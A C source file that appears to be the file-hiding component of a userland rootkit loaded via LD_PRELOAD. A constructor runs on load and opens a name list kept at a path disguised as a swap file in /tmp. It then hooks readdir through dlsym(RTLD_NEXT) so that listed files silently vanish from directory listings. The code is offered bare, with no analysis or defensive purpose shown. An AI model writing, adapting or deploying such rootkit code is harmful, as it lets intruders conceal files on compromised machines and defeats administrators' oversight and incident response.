#include <stdlib.h>
#include <dirent.h>
#include <dlfcn.h>

#include "db.h"
#include "log.h"

// Globals

static const char* db_path = "/tmp/ccr0J61R.txt.swp";
static const size_t db_size = 32;

typedef struct dirent* (*readdir_fp)(DIR *dirp);
readdir_fp readdir_orig = NULL;

// Macros

#define LENGTHOF(x) ((sizeof(x))/(sizeof(x[0])))

// Definitions

void __attach(void) __attribute__((constructor));
void __detach(void) __attribute__((destructor));

// External hook methods

extern struct dirent* readdir(DIR *dirp)
{
    struct dirent* ent;
    while (ent = readdir_orig(dirp)) {
        if (db_find(ent->d_name) < 0) {
            break;
        }
    }

    return ent;
}

// Static methods

static int hook_readdir()
{
    readdir_orig = (readdir_fp)dlsym(RTLD_NEXT, "readdir");
    if (!readdir_orig) {
        LOG("dlsym: %s", dlerror());
        errno = EIO;
        return -1;
    }

    return 0;
}

// Constructor and Destcructor methods

void __attach(void)
{
    int err;

    err = db_init(db_size, db_path);
    if (err) {
        ERR("db_init");
        return;
    }

    err = hook_readdir();
    if (err) {
        ERR("hook_readdir");
        return;
    }
}

void __detach(void)
{
    db_fini();
}
